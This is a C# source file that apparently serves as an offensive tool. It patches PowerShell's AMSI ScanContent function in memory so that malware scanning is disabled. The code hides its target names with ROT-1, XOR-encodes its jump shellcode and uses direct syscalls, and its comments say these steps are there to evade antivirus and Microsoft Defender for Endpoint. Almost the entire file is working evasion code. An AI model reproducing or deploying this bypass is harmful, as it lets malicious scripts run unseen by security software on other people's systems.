using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

//SysWhispers
using Data = SharpWhisp3rz.Data; //simple string substitution for AV evasion of static string "SharpWhispers"
using Syscall = Syscalls.Syscalls;

namespace Editor {
    public static class Methods {

        private static string keyX = "aW5jb25jZWl2YWJsZQ=="; //inconceivable
        private static byte[] XOR(string b64blob, string key)
        {

            List<byte> output1 = new List<byte>();

            byte[] decoded = Convert.FromBase64String(b64blob);
            byte[] dkey = Convert.FromBase64String(key);

            for (int i = 0; i < decoded.Length; i++)
            {
                output1.Add((byte)(decoded[i] ^ dkey[i % dkey.Length]));
            }

            return output1.ToArray();
        }

        public static void Patch() {
            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
            Methods.Patch(original, replacement);
        }

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private static int Dummy(string content, string metadata) {
            return 1;
        }

        public static void Patch(MethodInfo original, MethodInfo replacement)
        {
            //JIT compile methods
            RuntimeHelpers.PrepareMethod(original.MethodHandle);
            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);

            //Get pointers to the functions
            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
            Console.WriteLine("[!] OG Site  : {0}", originalSite.ToString("X8"));
            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
            Console.WriteLine("[!] Replace  : {0}", replacementSite.ToString("X8"));

            //Generate architecture specific shellcode (ORIGINAL)
            /*byte[] patch = null;
            if (IntPtr.Size == 8) {
                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };  //MDSE  gl\
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 2] = address[i];
                }
            } else {
                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 1] = address[i];
                }
            }*/

            //Generate architecture specific shellcode Encoded / "Encrypted"
            byte[] ptch = null;
            if (IntPtr.Size == 8)
            {

                ptch = XOR("INVjb25jZWl2YSOThg==", keyX);
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                for (int i = 0; i < address.Length; i++)
                {
                    ptch[i + 2] = address[i];
                }
            }
            else
            {
                ptch = XOR("AW5jb26g", keyX);
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
                for (int i = 0; i < address.Length; i++)
                {
                    ptch[i + 1] = address[i];
                }
            }

            //Temporarily change permissions to RWE
            uint oldprotect;

            //old code, which MDE may flag on
            /*if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, 0x40, out oldprotect))
            { 
                throw new Win32Exception();
            }*/
            int nPID = System.Diagnostics.Process.GetCurrentProcess().Id;
            Console.WriteLine("[!] Proc ID: {0}", nPID.ToString());

            IntPtr HProc = GetCurrentProcess();
            Console.WriteLine("[!] HProc  : {0}", HProc.ToString());

            IntPtr AllocationSize = (IntPtr)(ptch.Length); //IntPtr holding size of bytes

            oldprotect = Syscall.NtProtectVirtualMemory(HProc, ref originalSite, ref AllocationSize, 0x40);
            Console.WriteLine("[!] OldProtect  : {0}", oldprotect.ToString());
            if (oldprotect < 1)
            {
                Console.WriteLine("[!] Failure to change permissions!");
                throw new Win32Exception();
            }

            //Apply the patch
            IntPtr written = IntPtr.Zero;
            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, ptch, (uint)ptch.Length, out written))
            {
                Console.WriteLine("[!] Failure to write to memory!");
                throw new Win32Exception();
            }

            //Flush insutruction cache to make sure our new code executes
            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)ptch.Length))
            {
                Console.WriteLine("[!] Failure to flush instruction cache!");
                throw new Win32Exception();
            }

            //Restore the original memory protection settings
            /*if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, oldprotect, out oldprotect)) {
                throw new Win32Exception();
            }*/
            //Syscall.NtProtectVirtualMemory(GetCurrentProcess(), ref originalSite, ref AllocationSize, oldprotect);

        }
        private static string Transform(string input) {
            StringBuilder builder = new StringBuilder(input.Length + 1);    
            foreach(char c in input) {
                char m = (char)((int)c - 1); //ROT 1
                builder.Append(m);
            }
            return builder.ToString();
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); //MDE may flag on this

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt"); //AV evasion for System Management Automation AMSIUtils
        private static readonly string METHOD = Methods.Transform("TdboDpoufou");   //AV evasion for Scan Content Stub
    }
}
